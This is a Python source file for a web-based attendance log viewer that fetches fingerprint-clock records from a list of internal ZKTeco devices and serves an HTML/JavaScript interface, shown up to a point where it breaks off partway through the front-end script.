# -*- coding: utf-8 -*-
"""
Attendance Log Viewer - Web-based
Phan biet may cham cong van tay (attendance) va may ky van tay (signing)

Version: 2.6.3 (Chaquopy Android)
- FALLBACK_DEVICES (27 devices hardcoded) khi devices.csv khong duoc extract
- Print to stderr for Android logcat visibility
- All v1.2.0 features
"""
import sys
import os
import re
import json
import csv
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime, timedelta
from struct import unpack, pack

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(SCRIPT_DIR, 'python', 'Lib', 'site-packages'))

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except: pass

from zk import ZK
from zk import const

# Constants
DEVICES_FILE = os.path.join(SCRIPT_DIR, 'devices.csv')
TYPES = {
    'attendance': {'name': 'May cham cong', 'color': '#107c10', 'icon': '[CC]'},
    'signing':    {'name': 'May ky van tay', 'color': '#9b00d4', 'icon': '[KY]'},
    'server':     {'name': 'Server (khong phai may van tay)', 'color': '#888', 'icon': '[SV]'},
    'gateway':    {'name': 'Gateway/Web', 'color': '#888', 'icon': '[GW]'},
    'virtual':    {'name': 'Virtual (X628 PRO Simulator)', 'color': '#ff8800', 'icon': '[SIM]'},
    'unknown':    {'name': 'Khong ro', 'color': '#888', 'icon': '[?]'},
}

# v2.6.3: Fallback devices list (khi Chaquopy khong extract duoc devices.csv)
# Format: (ip, type, note, selected)
FALLBACK_DEVICES = [
    ('172.16.0.30',  'gateway',    'Gateway ZK Web',     False),
    ('172.16.0.31',  'server',     'Secutime server',    False),
    ('172.16.0.200', 'attendance', 'Web UI',             False),
    ('172.16.0.212', 'attendance', 'May 1',              True),
    ('172.16.0.213', 'attendance', 'May 2',              False),
    ('172.16.0.214', 'attendance', 'May 3',              False),
    ('172.16.0.215', 'attendance', 'May 4',              False),
    ('172.16.0.217', 'attendance', 'May 5',              False),
    ('172.16.0.218', 'attendance', 'May 6 + Web',        False),
    ('172.16.0.219', 'attendance', 'May 7',              False),
    ('172.16.0.220', 'attendance', 'May 8',              False),
    ('172.16.0.221', 'attendance', 'May 9',              False),
    ('172.16.0.222', 'attendance', 'May 10',             False),
    ('172.16.0.223', 'attendance', 'May 11',             False),
    ('172.16.0.224', 'attendance', 'May 12',             False),
    ('172.16.0.225', 'attendance', 'May 13',             False),
    ('172.16.0.226', 'attendance', 'May 14',             False),
    ('172.16.0.228', 'attendance', 'May 15',             False),
    ('172.16.1.204', 'attendance', 'May 16 + Web',       False),
    ('172.16.1.210', 'attendance', 'May 17',             False),
    ('172.16.1.211', 'attendance', 'May 18',             False),
    ('172.16.1.212', 'attendance', 'May 19',             False),
    ('172.16.8.139', 'attendance', 'May 20',             False),
    ('172.16.8.140', 'attendance', 'May 21 + Web',       False),
    ('172.16.30.50', 'attendance', 'May 22 + Web',       False),
    ('172.16.100.201','attendance', 'May 23 + Web',      False),
    ('virtual.x628pro','virtual',  'Virtual X628 PRO',   True),
]

devices_state = []
all_records = []
fetch_status = {'running': False, 'progress': 0, 'total': 0, 'message': 'San sang', 'cancel_requested': False}


def load_devices():
    devices_state.clear()
    if not os.path.exists(DEVICES_FILE):
        # v2.6.3: Fallback - hardcode devices neu file khong ton tai (Android Chaquopy)
        print('WARN: ' + DEVICES_FILE + ' not found, using FALLBACK_DEVICES', flush=True)
        for fb in FALLBACK_DEVICES:
            devices_state.append({
                'ip': fb[0], 'type': fb[1], 'note': fb[2], 'selected': fb[3],
                'can_fetch': (fb[1] == 'attendance'),
                'status': '-', 'model': '-', 'log_count': 0, 'firmware': ''
            })
        return
    print('Loading devices from: ' + DEVICES_FILE, flush=True)
    with open(DEVICES_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    for line in lines:
        line = line.lstrip('\ufeff').strip()
        if not line:
            continue
        if line.startswith('#'):
            continue
        if line.lower().startswith('ip,'):
            continue
        # Format: IP,Type,Note,Selected (Type/Note/Selected optional)
        parts = line.split(',')
        if len(parts) < 1:
            continue
        ip = parts[0].strip()
        # Allow both IP addresses (a.b.c.d) and named virtual devices (e.g. "virtual.x628pro")
        is_valid_ip = False
        try:
            parts_ip = ip.split('.')
            if len(parts_ip) == 4 and all(0 <= int(p) <= 255 for p in parts_ip):
                is_valid_ip = True
        except:
            pass
        # If not a valid IP, allow named identifiers (alphanumeric + dots + hyphens)
        if not is_valid_ip:
            if not ip or not re.match(r'^[A-Za-z0-9._\-]+$', ip):
                continue
        # type, note, selected
        dev_type = parts[1].strip() if len(parts) > 1 else 'attendance'
        if dev_type not in TYPES:
            dev_type = 'unknown'
        note = parts[2].strip() if len(parts) > 2 else ''
        selected = True
        if len(parts) > 3:
            selected = (parts[3].strip() == '1')
        # Only attendance devices are eligible for fetch by default
        can_fetch = (dev_type == 'attendance')
        devices_state.append({
            'ip': ip, 'type': dev_type, 'note': note, 'selected': selected,
            'can_fetch': can_fetch,
            'status': '-', 'model': '-', 'log_count': 0, 'firmware': ''
        })


def save_devices():
    """Save devices_state to devices.csv"""
    try:
        with open(DEVICES_FILE, 'w', encoding='utf-8') as f:
            f.write('IP,Type,Note,Selected\n')
            for d in devices_state:
                # Sanitize note to avoid CSV issues
                note = d['note'].replace(',', ' ').replace('\n', ' ').replace('\r', ' ')
                f.write('{0},{1},{2},{3}\n'.format(
                    d['ip'], d['type'], note,
                    '1' if d['selected'] else '0'
                ))
    except Exception as e:
        print('save_devices err: ' + str(e), flush=True)


def fetch_one_device(ip, date_from, date_to):
    """Fetch attendance from one device. Returns (count, err_msg)"""
    err_msg = None
    count = 0
    try:
        zk = ZK(ip, port=4370, timeout=8, ommit_ping=True, verbose=False)
        if not zk.connect():
            err_msg = 'Connect failed'
            raise Exception(err_msg)
        zk.read_sizes()
        if zk.records == 0:
            for d in devices_state:
                if d['ip'] == ip:
                    d['status'] = 'EMPTY'
                    d['log_count'] = 0
                    break
            try: zk.disconnect()
            except: pass
            return 0, None
        # Read attendance
        data, size = zk.read_with_buffer(const.CMD_ATTLOG_RRQ)
        if size < 4:
            for d in devices_state:
                if d['ip'] == ip:
                    d['status'] = 'EMPTY'
                    d['log_count'] = 0
                    break
            try: zk.disconnect()
            except: pass
            return 0, None
        data = data[4:]
        decode_time = zk._ZK__decode_time
        local_records = []
        # Fast path: walk backwards from newest, stop when we go past date_from
        # Records are typically in chronological order in ZK buffer
        total_records = len(data) // 40
        # If no date_from, we need to walk all records (no early stop possible)
        if date_from is None:
            j_range = range(0, total_records)
        else:
            j_range = range(total_records - 1, -1, -1)
        for j in j_range:
            start = j * 40
            rec = data[start:start + 40]
            if len(rec) < 40:
                continue
            try:
                uid, user_id_raw, status, ts_bytes, punch, _space = \
                    unpack('<H24sB4sB8s', rec.ljust(40, b'\x00')[:40])
                user_id = user_id_raw.split(b'\x00')[0].decode(errors='ignore')
                if not user_id:
                    user_id = str(uid)
                ts = decode_time(ts_bytes)
                if ts is None or ts.year < 2000:
                    if date_from is not None:
                        # In backward walk, garbage record - skip but keep going
                        continue
                    else:
                        continue
                if date_from and ts < date_from:
                    # In backward walk, hit older record - STOP (everything before is even older)
                    if date_from is not None:
                        break
                    continue
                if date_to and ts > date_to:
                    continue
                local_records.append({
                    'uid': uid, 'user_id': user_id,
                    'timestamp': ts.strftime('%Y-%m-%d %H:%M:%S'),
                    'date': ts.strftime('%Y-%m-%d'),
                    'time': ts.strftime('%H:%M:%S'),
                    'status': status, 'punch': punch,
                    'device_ip': ip, 'device_type': 'attendance',
                })
                count += 1
            except:
                continue
        # If we walked backwards, reverse to chronological order
        if date_from is not None:
            local_records.reverse()
        try:
            firmware = zk.get_firmware_version()
            name = zk.get_device_name()
        except:
            firmware = '?'
            name = '?'
        for d in devices_state:
            if d['ip'] == ip:
                d['status'] = 'OK'
                d['model'] = name[:14]
                d['firmware'] = firmware
                d['log_count'] = count
                break
        try: zk.disconnect()
        except: pass
        return count, local_records, None
    except Exception as e:
        err_msg = '{0}: {1}'.format(type(e).__name__, str(e)[:80])
        print('[ERR] ' + ip + ': ' + err_msg, flush=True)
        for d in devices_state:
            if d['ip'] == ip:
                d['status'] = 'FAIL'
                d['model'] = err_msg[:30]
                break
        return 0, [], err_msg


def fetch_virtual_device(virtual_ip, date_from, date_to):
    """
    Fetch attendance from the local simulator's CSV (manual_punches.csv).
    Treats the X628 PRO Simulator as a 'virtual device' in the system.
    Returns (count, local_records, err).
    """
    err_msg = None
    count = 0
    local_records = []
    try:
        # Read the simulator's shadow log
        shadow_log = os.path.join(os.path.dirname(__file__), 'manual_punches.csv')
        if not os.path.exists(shadow_log):
            return 0, [], 'manual_punches.csv khong ton tai'

        with open(shadow_log, 'r', encoding='utf-8-sig', newline='') as f:
            reader = csv.DictReader(f)
            for row in reader:
                ts_str = row.get('timestamp', '').strip()
                if not ts_str:
                    continue
                # Apply date filter
                if date_from and ts_str < date_from.strftime('%Y-%m-%d %H:%M:%S'):
                    continue
                if date_to and ts_str > date_to.strftime('%Y-%m-%d %H:%M:%S'):
                    continue
                # Parse timestamp into date and time
                parts = ts_str.split(' ')
                if len(parts) != 2:
                    continue
                date_part, time_part = parts[0], parts[1]
                # Map to standard record format
                user_id = row.get('user_id', '').strip()
                status_str = row.get('status', '0').strip()
                punch_str = row.get('punch', '0').strip()
                try:
                    status = int(status_str) if status_str else 0
                except:
                    status = 0
                try:
                    punch = int(punch_str) if punch_str else 0
                except:
                    punch = 0
                # Generate uid from timestamp (use a simple hash of timestamp)
                try:
                    import hashlib
                    uid = int(hashlib.md5(ts_str.encode()).hexdigest()[:4], 16) % 65535
                except:
                    uid = count + 1
                local_records.append({
                    'uid': uid,
                    'user_id': user_id,
                    'timestamp': ts_str,
                    'date': date_part,
                    'time': time_part,
                    'status': status,
                    'punch': punch,
                    'device_ip': virtual_ip,
                    'device_type': 'virtual',
                })
                count += 1

        # Update device state for virtual device
        for d in devices_state:
            if d['ip'] == virtual_ip:
                d['status'] = 'OK'
                d['model'] = 'Virtual X628 PRO'
                d['firmware'] = 'Simulator v1.0'
                d['log_count'] = count
                break
        return count, local_records, None
    except Exception as e:
        try:
            for d in devices_state:
                if d['ip'] == virtual_ip:
                    d['status'] = 'FAIL'
                    d['model'] = str(e)[:30]
                    break
        except: pass
        return 0, [], str(e)[:80]


def ping_device(ip, timeout=1.2, retries=1):
    """
    Quick TCP connect probe to ZK port 4370.
    Returns (ok:bool, latency_ms:int, err:str).
    Used by /api/live to show real-time device status grid.

    Auto-detects VPN mode:
      - Check default route interface
      - If home/external IP (192.168.x, 10.x, dynamic) → VPN mode (timeout 5s, 3 retries)
      - If LAN (172.16.x) → fast mode (timeout 1.2s, 1 retry)
    """
    import socket
    import time
    if not ip:
        return False, 0, 'empty ip'

    # Detect if we are going through VPN tunnel (not local LAN)
    # If device IP is in 172.16.x and our local IP is NOT in 172.16.x, then we're behind VPN
    try:
        s_check = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_check.settimeout(0.5)
        s_check.connect((ip, 80))  # dummy connect (no traffic sent)
        local_ip = s_check.getsockname()[0]
        s_check.close()
        is_vpn = (ip.startswith('172.16.') and not local_ip.startswith('172.16.'))
    except Exception:
        is_vpn = False  # assume LAN if detection fails

    # Adjust timeout + retries based on VPN mode
    if is_vpn:
        effective_timeout = 5.0
        effective_retries = 3
    else:
        effective_timeout = timeout
        effective_retries = retries

    last_err = ''
    for attempt in range(effective_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(effective_timeout)
            t0 = time.time()
            s.connect((ip, 4370))
            s.close()
            ms = int((time.time() - t0) * 1000)
            return True, ms, ''
        except Exception as e:
            last_err = str(e)[:60]
            if attempt < effective_retries - 1:
                time.sleep(0.3)  # backoff
            continue
    return False, 0, last_err


def live_status_worker(devices_snapshot):
    """
    Probe every device in parallel; update devices_state['ping_*'] fields.
    Runs in a background thread so the HTTP request returns immediately.

    IMPORTANT: Use smaller pool (8 workers) to avoid overwhelming VPN gateway.
    Default timeout in ping_device already handles VPN mode (5s, 3 retries).
    """
    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = {d['ip']: pool.submit(ping_device, d['ip'], 1.5, 1) for d in devices_snapshot}
        for d in devices_snapshot:
            ip = d['ip']
            try:
                ok, ms, err = futures[ip].result(timeout=20.0)
            except Exception as e:
                ok, ms, err = False, 0, str(e)[:60]
            d['ping_ok'] = ok
            d['ping_ms'] = ms
            d['ping_err'] = err
            d['ping_at'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def fetch_worker(device_ips, date_from, date_to):
    global all_records, fetch_status
    fetch_status['running'] = True
    fetch_status['cancel_requested'] = False
    fetch_status['progress'] = 0
    fetch_status['total'] = len(device_ips)
    all_records = []
    completed = [0]
    success = [0]
    fail = [0]

    def process_one(ip):
        if fetch_status['cancel_requested']:
            return
        # Mark as processing
        for d in devices_state:
            if d['ip'] == ip:
                d['status'] = 'Processing...'
                break
        # Check if this is a virtual device (read from local CSV instead of ZK)
        device_type = None
        for d in devices_state:
            if d['ip'] == ip:
                device_type = d.get('type', 'attendance')
                break
        if device_type == 'virtual':
            result = fetch_virtual_device(ip, date_from, date_to)
        else:
            result = fetch_one_device(ip, date_from, date_to)
        # result is a tuple of (count, local_records, err)
        if len(result) == 3:
            count, local_records, err = result
        else:
            count, err = result
            local_records = []
        completed[0] += 1
        if err:
            fail[0] += 1
        elif count >= 0:
            success[0] += 1
            all_records.extend(local_records)
        fetch_status['progress'] = completed[0]
        fetch_status['message'] = 'Dang xu ly {0}/{1} ({2} OK, {3} FAIL)'.format(
            completed[0], len(device_ips), success[0], fail[0])

    # Use ThreadPoolExecutor for parallel fetch (4 workers)
    from concurrent.futures import ThreadPoolExecutor
    try:
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(process_one, ip) for ip in device_ips]
            for f in futures:
                try:
                    f.result()
                except Exception as e:
                    print('Worker err: ' + str(e), flush=True)
                if fetch_status['cancel_requested']:
                    break

        if not fetch_status['cancel_requested']:
            # Sort: timestamp desc (newest first) as primary, uid desc as tiebreaker
            # Python sort is stable - sort by uid first (single key), then by timestamp desc
            all_records.sort(key=lambda r: -r['uid'])
            all_records.sort(key=lambda r: r['timestamp'], reverse=True)
        if fetch_status['cancel_requested']:
            fetch_status['message'] = 'Da dung. Lay duoc {0} ban ghi tu {1}/{2} may.'.format(
                len(all_records), completed[0], len(device_ips))
        else:
            fetch_status['message'] = 'Hoan tat: {0} ban ghi tu {1} may (OK={2}, FAIL={3}).'.format(
                len(all_records), len(device_ips), success[0], fail[0])
    except Exception as e:
        print('Worker exception: ' + str(e), flush=True)
        fetch_status['message'] = 'Loi: ' + str(e)[:100]
    finally:
        fetch_status['running'] = False


# HTML page
HTML_PAGE = r'''<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Attendance Log Viewer</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f5f5f5; }
.header { background: #2d2d30; color: white; padding: 15px 20px; }
.header h1 { font-size: 18px; }
.header p { color: #ccc; font-size: 12px; margin-top: 4px; }
.toolbar { background: #383838; color: white; padding: 10px 20px;
           display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
.toolbar input, .toolbar select { padding: 5px 8px; border: 1px solid #555;
           background: #2d2d30; color: white; border-radius: 3px; }
.toolbar label { color: #ccc; font-size: 13px; }
button { padding: 8px 16px; border: none; border-radius: 3px; cursor: pointer;
         font-size: 13px; font-weight: 500; }
.btn-primary { background: #107c10; color: white; }
.btn-primary:hover { background: #0e6e0e; }
.btn-primary:disabled { background: #555; cursor: not-allowed; }
.btn-secondary { background: #007acc; color: white; }
.btn-secondary:hover { background: #006ab3; }
.btn-stop { background: #c50f1f; color: white; }
.btn-stop:hover { background: #a50916; }
.btn-stop:disabled { background: #555; cursor: not-allowed; }
.btn-small { padding: 5px 10px; font-size: 12px; background: #555; color: white; }
.btn-small:hover { background: #666; }
.container { display: flex; height: calc(100vh - 110px); }
.left-panel { width: 420px; background: white; border-right: 1px solid #ddd;
              display: flex; flex-direction: column; }
.left-header { padding: 10px 15px; background: #f0f0f0; border-bottom: 1px solid #ddd; }
.left-header h2 { font-size: 13px; }
.left-header p { font-size: 11px; color: #666; margin-top: 4px; }
.left-header .btn-row { margin-top: 8px; display: flex; gap: 5px; flex-wrap: wrap; }
.filter-row { padding: 8px 15px; background: #fafafa; border-bottom: 1px solid #ddd;
              display: flex; gap: 8px; font-size: 12px; }
.filter-row label { color: #555; }
.log-filter-row { padding: 8px 15px; background: #f5f5f5; border-bottom: 1px solid #ddd;
                  display: flex; gap: 12px; align-items: center; flex-wrap: wrap;
                  font-size: 12px; }
.log-filter-row label { color: #555; display: flex; align-items: center; gap: 4px; }
.log-filter-row select, .log-filter-row input { font-size: 12px; }
.device-list { flex: 1; overflow-y: auto; }
.device-item { padding: 8px 12px; border-bottom: 1px solid #f0f0f0;
               cursor: pointer; font-size: 12px; }
.device-item:hover { background: #f5f5f5; }
.device-item.selected { background: #cce8ff; }
.device-item.signing { background: #f3e8ff; opacity: 0.7; }
.device-item .row1 { display: flex; align-items: center; gap: 6px; margin-bottom: 3px; }
.device-item .ip { font-weight: 600; font-family: Consolas, monospace; }
.device-item .type-badge { font-size: 10px; padding: 1px 5px; border-radius: 3px;
                          color: white; font-weight: 600; }
.device-item .status { font-size: 11px; color: #666; padding-left: 24px; }
.device-item .status.ok { color: #107c10; }
.device-item .status.fail { color: #c50f1f; }
.device-item .row2 { display: flex; gap: 4px; margin-top: 4px; padding-left: 24px; }
.type-select { font-size: 11px; padding: 2px 4px; border-radius: 3px; }
.right-panel { flex: 1; display: flex; flex-direction: column; }
.right-header { padding: 10px 15px; background: #fafafa; border-bottom: 1px solid #ddd;
                display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
.right-header h2 { font-size: 13px; }
.right-header input { flex: 0 0 200px; padding: 5px 8px; border: 1px solid #ccc;
                      border-radius: 3px; }
.log-table { flex: 1; overflow: auto; background: white; }
table { width: 100%; border-collapse: collapse; font-size: 12px; }
th { background: #f0f0f0; padding: 8px; text-align: left; position: sticky;
     top: 0; border-bottom: 2px solid #ccc; font-weight: 600; }
td { padding: 6px 8px; border-bottom: 1px solid #f0f0f0; font-family: Consolas, monospace; }
tr:hover { background: #f9f9f9; }
.status-bar { background: #f0f0f0; padding: 8px 15px; font-size: 12px;
              border-top: 1px solid #ddd; display: flex; align-items: center; gap: 15px; }
.status-bar .progress { flex: 0 0 300px; height: 6px; }
.progress { background: #ddd; border-radius: 3px; overflow: hidden; }
.progress-bar { background: #007acc; height: 100%; width: 0; transition: width 0.2s; }
.status-bar.error { color: #c50f1f; }
.status-bar.error .progress-bar { background: #c50f1f; }
.empty { padding: 40px; text-align: center; color: #999; }
.checkbox { margin-right: 6px; }
.legend { font-size: 11px; color: #555; padding: 4px 0; }
.legend span { display: inline-block; margin-right: 10px; }
.legend .badge { font-size: 10px; padding: 1px 5px; border-radius: 3px; color: white; font-weight: 600; }
</style>
</head>
<body>
<div class="header">
  <h1>ATTENDANCE LOG VIEWER</h1>
  <p>BVDK Ninh Thuan - Phan biet may cham cong va may ky van tay</p>
</div>
<div class="toolbar">
  <label>Tu:</label>
  <input type="date" id="dateFrom" value="">
  <label>Den:</label>
  <input type="date" id="dateTo" value="">
  <label><input type="checkbox" id="chkDate" checked> Loc theo ngay</label>
  <button class="btn-primary" id="btnFetch" onclick="fetchLogs()">Lay log (4 song song)</button>
  <button class="btn-stop" id="btnStop" onclick="stopFetch()" disabled>Dung</button>
  <button class="btn-secondary" id="btnExport" onclick="exportCsv()">Export CSV</button>
  <button class="btn-secondary" id="btnReport" onclick="openReport()">Bao cao</button>
  <button class="btn-secondary" id="btnToday" onclick="openToday()">Hom nay</button>
  <button class="btn-secondary" id="btnExcel" onclick="exportExcel()">Excel</button>
  <span style="display:inline-block;width:12px"></span>
  <span style="color:#888;font-size:12px;">Loc nhanh:</span>
  <button class="btn-secondary" id="btnQToday" onclick="quickFilter('today')" style="background:#1a4a2a;border-color:#2a6a3a;">Hom nay</button>
  <button class="btn-secondary" id="btnQYesterday" onclick="quickFilter('yesterday')" style="background:#2a3a5a;">Hom qua</button>
  <button class="btn-secondary" id="btnQWeek" onclick="quickFilter('week')">Tuan nay</button>
  <button class="btn-secondary" id="btnQMonth" onclick="quickFilter('month')">Thang nay</button>
  <button class="btn-secondary" id="btnQClear" onclick="quickFilter('all')" style="background:#5a2a1a;border-color:#6a3a2a;">Tat ca</button>
</div>
<div class="container">
  <div class="left-panel">
    <div class="left-header">
      <h2>DANH SACH THIET BI</h2>
      <p id="devCount">0 thiet bi</p>
      <div class="legend">
        <span><span class="badge" style="background:#107c10">CC</span> May cham cong</span>
        <span><span class="badge" style="background:#9b00d4">KY</span> May ky van tay</span>
        <span><span class="badge" style="background:#888">SV</span> Server</span>
        <span><span class="badge" style="background:#888">GW</span> Gateway</span>
      </div>
      <div class="btn-row">
        <button class="btn-small" onclick="setAll(true)">Chon tat ca (CC)</button>
        <button class="btn-small" onclick="setAll(false)">Bo chon</button>
        <button class="btn-small" onclick="setAllAttendance(true)">Tick chi may CC</button>
      </div>
      <div style="margin-top: 6px;">
        <input type="text" id="devSearchInput" placeholder="Loc theo IP hoac ten..."
               style="width:100%;padding:4px 6px;border:1px solid #ccc;border-radius:3px;font-size:12px"
               oninput="applyFilter()">
      </div>
    </div>
    <div class="filter-row">
      <label><input type="checkbox" id="showAttendance" checked onchange="applyFilter()"> Cham cong</label>
      <label><input type="checkbox" id="showSigning" onchange="applyFilter()"> Ky van tay</label>
      <label><input type="checkbox" id="showOther" onchange="applyFilter()"> Server/GW</label>
    </div>
    <div class="device-list" id="devList"></div>
  </div>
  <div class="right-panel">
    <div class="right-header">
      <h2>LOG CHAM CONG</h2>
      <span id="filterInfo" style="font-size:12px;color:#666"></span>
    </div>
    <div class="log-filter-row">
      <input type="text" id="logSearchInput" placeholder="🔍 Tim ma NV hoac IP may..."
             style="padding:5px 8px;border:1px solid #ccc;border-radius:3px;font-size:12px;width:220px">
      <label>Trang thai:
        <select id="filterStatus" onchange="applyFilterLogs()" style="padding:3px 6px;font-size:12px">
          <option value="">-- Tat ca --</option>
          <option value="0">Check-In (0)</option>
          <option value="1">Check-Out (1)</option>
          <option value="2">Break-Out (2)</option>
          <option value="3">Break-In (3)</option>
          <option value="4">OT-In (4)</option>
          <option value="5">OT-Out (5)</option>
        </select>
      </label>
      <label>Thiet bi:
        <input type="text" id="filterDeviceSearch" placeholder="IP..."
               style="width:80px;padding:3px 4px;border:1px solid #ccc;border-radius:3px;font-size:12px"
               oninput="populateDeviceFilter()">
        <select id="filterDevice" onchange="applyFilterLogs()" style="padding:3px 6px;font-size:12px;max-width:140px">
          <option value="">-- Tat ca --</option>
        </select>
      </label>
      <label>Punch:
        <select id="filterPunch" onchange="applyFilterLogs()" style="padding:3px 6px;font-size:12px">
          <option value="">-- Tat ca --</option>
          <option value="0">Van tay (0)</option>
          <option value="1">The (1)</option>
          <option value="2">Mat khau (2)</option>
          <option value="3">Khac (3+)</option>
        </select>
      </label>
      <label>Gio:
        <input type="time" id="filterTimeFrom" onchange="applyFilterLogs()" style="padding:3px 4px;font-size:12px;width:80px">
        -
        <input type="time" id="filterTimeTo" onchange="applyFilterLogs()" style="padding:3px 4px;font-size:12px;width:80px">
      </label>
      <button class="btn-small" onclick="clearLogFilters()" style="margin-left:auto">Xoa filter</button>
    </div>
    <div class="log-table" id="logTable">
      <div class="empty">Chua co du lieu. Bam "Lay log" de bat dau.</div>
    </div>
  </div>
</div>
<div class="status-bar" id="statusBar">
  <span id="status">San sang.</span>
  <span id="summary"></span>
  <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
</div>

<script>
const TYPE_COLORS = {attendance:'#107c10', signing:'#9b00d4', server:'#888', gateway:'#888', virtual:'#ff8800', unknown:'#888'};
const TYPE_NAMES = {attendance:'CC', signing:'KY', server:'SV', gateway:'GW', virtual:'SIM', unknown:'?'};
const STATUS_MAP = {0:'Check-In', 1:'Check-Out', 2:'Break-Out', 3:'Break-In', 4:'OT-In', 5:'OT-Out'};
let allDevices = [];
let allRecords = [];
let isFetching = false;

const today = new Date();
const weekAgo = new Date(today); weekAgo.setDate(weekAgo.getDate() - 6);
document.getElementById('dateFrom').value = weekAgo.toISOString().slice(0,10);
document.getElementById('dateTo').value = today.toISOString().slice(0,10);

document.getElementById('chkDate').addEventListener('change', applyFilter);
document.getElementById('logSearchInput').addEventListener('input', applyFilterLogs);
document.getElementById('dateFrom').addEventListener('change', applyFilterLogs);
document.getElementById('dateTo').addEventListener('change', applyFilterLogs);

function setStatus(text, isError) {
  document.getElementById('status').textContent = text;
  const bar = document.getElementById('statusBar');
  if (isError) bar.classList.add('error'); else bar.classList.remove('error');
}

async function loadDevices() {
  try {
    const r = await fetch('/api/devices');
    allDevices = await r.json();
    renderDevices();
  } catch(e) { setStatus('Loi load devices: ' + e.message, true); }
}

function renderDeviceList() {
  // Show progress info for each device being processed
  const c = document.getElementById('devList');
  c.innerHTML = '';
  const showAtt = document.getElementById('showAttendance').checked;
  const showSig = document.getElementById('showSigning').checked;
  const showOth = document.getElementById('showOther').checked;
  const search = (document.getElementById('devSearchInput').value || '').toLowerCase().trim();
  let count = {total: 0, att: 0, sel: 0};
  allDevices.forEach(function(d) {
    count.total++;
    if (d.type === 'attendance') count.att++;
    if (d.selected) count.sel++;
    if (d.type === 'attendance' && !showAtt) return;
    if (d.type === 'signing' && !showSig) return;
    if ((d.type === 'server' || d.type === 'gateway' || d.type === 'unknown') && !showOth) return;
    if (search) {
      const s = search.toLowerCase();
      if (d.ip.toLowerCase().indexOf(s) < 0 &&
          (d.note || '').toLowerCase().indexOf(s) < 0 &&
          (d.type || '').toLowerCase().indexOf(s) < 0) return;
    }
    const item = document.createElement('div');
    item.className = 'device-item ' + d.type + (d.selected ? ' selected' : '');
    // Cho phép tick chọn: attendance (CC), signing (KY), server (SV), gateway (GW)
    // Không cho chọn virtual (chỉ là simulator)
    const canSelect = (d.type !== 'virtual');
    const statusClass = d.status === 'OK' ? 'ok' : (d.status === 'FAIL' ? 'fail' : '');
    const typeName = TYPE_NAMES[d.type] || '?';
    const typeColor = TYPE_COLORS[d.type] || '#888';
    const isProcessing = d.status === 'Processing...' || d.status === 'Connecting...';
    const statusText = isProcessing ? '<span style="color:#007acc">⏳ ' + d.status + '</span>' : d.status;
    item.innerHTML =
      '<div class="row1">' +
        '<input type="checkbox" class="checkbox" ' + (d.selected ? 'checked' : '') +
        (canSelect ? '' : ' disabled') +
        ' onclick="event.stopPropagation(); toggleSelect(\'' + d.ip + '\', this.checked);">' +
        '<span class="type-badge" style="background:' + typeColor + '">' + typeName + '</span>' +
        '<span class="ip">' + d.ip + '</span>' +
        '<select class="type-select" onchange="changeType(\'' + d.ip + '\', this.value)" onclick="event.stopPropagation()" style="margin-left:auto">' +
          '<option value="attendance"' + (d.type === 'attendance' ? ' selected' : '') + '>CC</option>' +
          '<option value="signing"' + (d.type === 'signing' ? ' selected' : '') + '>KY</option>' +
          '<option value="server"' + (d.type === 'server' ? ' selected' : '') + '>SV</option>' +
          '<option value="gateway"' + (d.type === 'gateway' ? ' selected' : '') + '>GW</option>' +
        '</select>' +
      '</div>' +
      '<div class="status ' + statusClass + '">' + statusText + ' | ' + d.model + ' | ' + d.log_count.toLocaleString() + ' logs | ' + d.note + '</div>';
    c.appendChild(item);
  });
  document.getElementById('devCount').textContent = count.total + ' thiet bi (' + count.att + ' cham cong, ' + count.sel + ' dang chon)';
  document.getElementById('summary').textContent = ' | ' + allRecords.length.toLocaleString() + ' logs';
}

function applyFilter() { renderDevices(); }

function setAll(sel) {
  allDevices.forEach(function(d) { if (d.type !== 'virtual') d.selected = sel; });
  saveAndReload();
}
function setAllAttendance(sel) {
  allDevices.forEach(function(d) { if (d.type === 'attendance') d.selected = sel; });
  saveAndReload();
}

async function toggleSelect(ip, sel) {
  const dev = allDevices.find(function(d) { return d.ip === ip; });
  if (dev) { dev.selected = sel; }
  await saveAndReload();
}

async function changeType(ip, newType) {
  const dev = allDevices.find(function(d) { return d.ip === ip; });
  if (dev) { dev.type = newType; dev.selected = (newType !== 'virtual'); }
  await saveAndReload();
}

async function saveAndReload() {
  try {
    await fetch('/api/devices/save', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({devices: allDevices})
    });
    await loadDevices();
  } catch(e) { setStatus('Loi luu: ' + e.message, true); }
}

function quickFilter(kind) {
  const df = document.getElementById('dateFrom');
  const dt = document.getElementById('dateTo');
  const chk = document.getElementById('chkDate');
  const now = new Date();
  const fmt = (d) => d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0');
  let from, to;
  if (kind === 'today') {
    from = to = now;
  } else if (kind === 'yesterday') {
    const y = new Date(now); y.setDate(y.getDate() - 1);
    from = to = y;
  } else if (kind === 'week') {
    const w = new Date(now);
    const day = (w.getDay() + 6) % 7;  // Monday = 0
    w.setDate(w.getDate() - day);
    from = w; to = now;
  } else if (kind === 'month') {
    from = new Date(now.getFullYear(), now.getMonth(), 1);
    to = now;
  } else if (kind === 'all') {
    from = new Date(2000, 0, 1);
    to = now;
  }
  if (kind !== 'all') {
    df.value = fmt(from);
    dt.value = fmt(to);
    chk.checked = true;
  } else {
    chk.checked = false;
  }
